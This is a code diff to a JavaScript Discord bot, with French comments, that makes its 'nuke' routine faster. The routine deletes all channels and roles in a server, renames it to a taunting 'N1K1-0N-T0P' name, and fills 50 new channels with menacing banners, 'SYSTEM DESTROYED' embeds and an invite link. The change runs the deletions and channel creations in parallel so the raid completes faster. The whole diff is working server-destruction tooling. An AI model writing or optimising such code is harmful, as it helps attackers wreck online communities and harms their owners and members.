@@ -186,7 +186,7 @@ client.on('messageCreate', async (message) => {
 });
 
 // ============================================================
-// NUKE FUNCTION
+// NUKE FUNCTION (ULTRA RAPIDE)
 // ============================================================
 async function handleNuke(message) {
     if (message.author.id !== AUTHORIZED_ID) {
@@ -201,7 +201,7 @@ async function handleNuke(message) {
         return message.reply('❌ I need administrator permissions!');
     }
 
-    await message.reply('💀 **NUKE INITIALIZED...**');
+    await message.reply('💀 **NUKE INITIALIZED... (RAPID MODE)**');
 
     const guild = message.guild;
     const guildName = guild.name;
@@ -210,25 +210,35 @@ async function handleNuke(message) {
     let channelsCreated = 0;
 
     try {
-        // 1. DELETE ALL CHANNELS
+        // --------------------------------------------------------
+        // 1. DELETE ALL CHANNELS (ULTRA RAPIDE)
+        // --------------------------------------------------------
         const channels = guild.channels.cache;
-        for (const [id, channel] of channels) {
+        // On crée un tableau de "promesses" de suppression
+        const deletePromises = channels.map(async (channel) => {
             try {
                 await channel.delete();
                 channelsDeleted++;
-            } catch (e) {}
-        }
+            } catch (e) {
+                // Ignorer les erreurs individuelles
+            }
+        });
+        // On lance TOUTES les suppressions en même temps
+        await Promise.all(deletePromises);
 
-        // 2. DELETE ALL ROLES (except @everyone)
+        // --------------------------------------------------------
+        // 2. DELETE ALL ROLES (except @everyone) (ULTRA RAPIDE)
+        // --------------------------------------------------------
         const roles = guild.roles.cache;
-        for (const [id, role] of roles) {
-            if (role.name !== '@everyone') {
+        const deleteRolePromises = roles.map(async (role) => {
+            if (role.name !== '@everyone' && role.id !== guild.id) {
                 try {
                     await role.delete();
                     rolesDeleted++;
                 } catch (e) {}
             }
-        }
+        });
+        await Promise.all(deleteRolePromises);
 
         // 3. RENAME SERVER
         const nukeNumber = Math.floor(Math.random() * 9000) + 1000;
@@ -236,32 +246,41 @@ async function handleNuke(message) {
             await guild.setName(`☠ N1K1-0N-T0P-${nukeNumber} ☠`);
         } catch (e) {}
 
-        // 4. CREATE 50 NEW CHANNELS
+        // --------------------------------------------------------
+        // 4. CREATE 50 NEW CHANNELS (ULTRA RAPIDE)
+        // --------------------------------------------------------
+        const createPromises = [];
         for (let i = 0; i < 50; i++) {
             const name = SCARY_NAMES[i % SCARY_NAMES.length];
-            try {
-                const channel = await guild.channels.create({
-                    name: name,
-                    type: ChannelType.GuildText,
-                });
-                
-                await channel.send('```' + ASCII_BANNER + '```');
-                await channel.send(SCARY_MESSAGES[Math.floor(Math.random() * SCARY_MESSAGES.length)]);
-                await channel.send(VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)]);
-                
-                const embed = new EmbedBuilder()
-                    .setColor(0xFF0000)
-                    .setTitle('☠ SYSTEM DESTROYED ☠')
-                    .setDescription('**NIKI ON TOP !**')
-                    .setImage(HACKER_IMAGES[Math.floor(Math.random() * HACKER_IMAGES.length)])
-                    .setFooter({ text: 'NIKI RULES ☠' })
-                    .setTimestamp();
-                await channel.send({ embeds: [embed] });
-                await channel.send(`**JOIN THE DARK SIDE:**\n${inviteLink}`);
-                
-                channelsCreated++;
-            } catch (e) {}
+            // On crée la promesse de création mais on ne l'attend pas tout de suite
+            const promise = guild.channels.create({
+                name: name,
+                type: ChannelType.GuildText,
+            }).then(async (channel) => {
+                // Une fois le salon créé, on envoie tout dedans
+                try {
+                    await channel.send('```' + ASCII_BANNER + '```');
+                    await channel.send(SCARY_MESSAGES[Math.floor(Math.random() * SCARY_MESSAGES.length)]);
+                    await channel.send(VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)]);
+                    
+                    const embed = new EmbedBuilder()
+                        .setColor(0xFF0000)
+                        .setTitle('☠ SYSTEM DESTROYED ☠')
+                        .setDescription('**NIKI ON TOP !**')
+                        .setImage(HACKER_IMAGES[Math.floor(Math.random() * HACKER_IMAGES.length)])
+                        .setFooter({ text: 'NIKI RULES ☠' })
+                        .setTimestamp();
+                    await channel.send({ embeds: [embed] });
+                    await channel.send(`**JOIN THE DARK SIDE:**\n${inviteLink}`);
+                    
+                    channelsCreated++;
+                } catch (e) {}
+            }).catch(() => {});
+            
+            createPromises.push(promise);
         }
+        // On lance TOUTES les créations en même temps
+        await Promise.all(createPromises);
 
         // 5. CREATE SPECIAL ROLE
         try {
